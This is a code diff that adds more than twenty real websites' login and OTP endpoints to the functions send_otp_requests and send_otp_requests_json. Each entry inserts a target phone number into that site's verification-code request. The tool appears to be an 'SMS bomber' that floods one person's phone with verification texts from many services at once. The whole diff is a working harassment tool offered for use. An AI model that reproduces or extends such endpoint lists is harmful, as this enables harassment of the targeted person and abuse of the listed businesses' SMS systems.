@@ -1,7 +1,20 @@
 def send_otp_requests(number):
     url_payload_map = {
         'janebi': ('https://janebi.com/signin?do', {'resend': '0' + number}),
+        'kavirmotor': ('https://kavirmotor.com/sms/send', {'phoneNumber': '0' + number}),
+        'chechilas': ('https://chechilas.com/user/login', {'mob': '0' + number}),
         'badparak': ('https://badparak.com/register/request_verification_code', {'mobile': '0' + number}),
+        'hermeskala': ('https://hermeskala.com//login/send_vcode', {'mobile_number': '0' + number}),
+        'elinorboutique': ('https://api.elinorboutique.com/v1/customer/register-login', {'mobile': '0' + number}),
+        'atlasmode': ('https://api.atlasmode.ir/v1/customer/register-login?version=new2', {'mobile': '0' + number}),
+        'pooshakshoniz': ('https://api.pooshakshoniz.com/v1/customer/register-login?version=new1', {'mobile': '0' + number}),
+        'ubike': ('https://ubike.ir/index.php?route=extension/module/websky_otp/send_code', {'telephone': '0' + number}),
+        'benedito': ('https://api.benedito.ir/v1/customer/register-login?version=new1', {'mobile': '0' + number}),
+        'rubeston': ('https://www.rubeston.com/api/customers/login-register', {'mobile': '0' + number,'step':'1'}),
+        'primashop': ('https://primashop.ir/index.php?route=extension/module/websky_otp/send_code', {'telephone' : '0' + number}),
+        'payagym': ('https://payagym.com/wp-admin/admin-ajax.php', {'mobile': '0' + number,'action':'kerasno_proform_register_inline_send'}),
+        'bartarinha': ('https://bartarinha.com/Advertisement/Users/RequestLoginMobile', {'mobileNo': '0' + number,'X-Requested-With':'XMLHttpRequest'}),
+        'manoshahr': ('https://manoshahr.ir/jq.php', {'mobile': '0' + number,'class_name':'public_login','function_name':'sendCode'}),
         'nalinoco': ('https://www.nalinoco.com/api/customers/login-register', {'mobile': '0' + number,'ReturnUrl':'/','step':'1'}),
         'hiss': ('https://hiss.ir/wp-admin/admin-ajax.php', {'phone_email': '0' + number,'action':'bakala_send_code'}),
         'tahrir-online': ('https://tahrir-online.ir/wp-admin/admin-ajax.php', {'phone': '+98' + number,'form':'register','action':'mobix_send_otp_code'}),
@@ -181,6 +194,11 @@ def send_otp_requests(number):
             'redirect': 'https://titomarket.com/my-account',
             'telephone':'0' + number
         }),
+        'nikanbike': (f'https://nikanbike.com/?rand={number}', {
+            'controller': 'authentication','back':'my-account','fc':'module',
+            'ajax': 'true','module':'iverify',
+            'phone_mobile':'0' + number,'SubmitCheck':''
+        }),
     }
     return list(url_payload_map.values())
 
@@ -193,6 +211,8 @@ def send_otp_requests_json(number):
         'rastaraccessory': ('https://rastaraccessory.ir/api/v1/sessions/login_request', {"mobile_phone" : "0" + number + ""}),
         'vinaaccessory': ('https://vinaaccessory.com/api/v1/sessions/login_request', {"mobile_phone" : "0" + number + ""}),
         'chortkehshop': ('https://chortkehshop.ir/api/v1/sessions/login_request', {"mobile_phone" : "0" + number + ""}),
+        'piinkstore': ('https://piinkstore.ir/api/v1/sessions/login_request', {"mobile_phone" : "0" + number + ""}),
+        'dreamlandshop': ('https://dreamlandshop.ir/api/v1/sessions/login_request', {"mobile_phone" : "0" + number + ""}),
         
     }
 
